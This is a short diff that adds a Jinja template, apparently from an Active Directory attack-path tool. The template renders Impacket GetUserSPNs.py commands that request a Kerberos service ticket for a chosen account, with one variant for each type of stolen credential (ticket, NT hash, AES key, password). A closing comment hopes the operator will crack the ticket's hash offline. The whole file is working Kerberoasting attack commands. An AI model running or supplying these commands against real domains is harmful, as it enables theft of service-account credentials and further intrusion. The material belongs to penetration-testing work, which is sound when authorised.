@@ -1,0 +1,13 @@
+# Request a TGS for {{target.name}}
+{% if parent.krb_auth %}
+GetUserSPNs.py '{{fqdn}}/{{parent.obj.name}}' -k -no-pass -dc-ip {{dc_ip}} -request-user {{target.name}}
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+GetUserSPNs.py '{{fqdn}}/{{parent.obj.name}}' -hashes :{{parent.secret|red}} -dc-ip {{dc_ip}} -request-user {{target.name}}
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+GetUserSPNs.py '{{fqdn}}/{{parent.obj.name}}' -k -no-pass -aesKey {{parent.secret|red}} -dc-ip {{dc_ip}} -request-user {{target.name}}
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+GetUserSPNs.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}' -dc-ip {{dc_ip}} -request-user {{target.name}}
+{%- endif %}
+
+
+# Hoping you will crack the hash in the ticket...
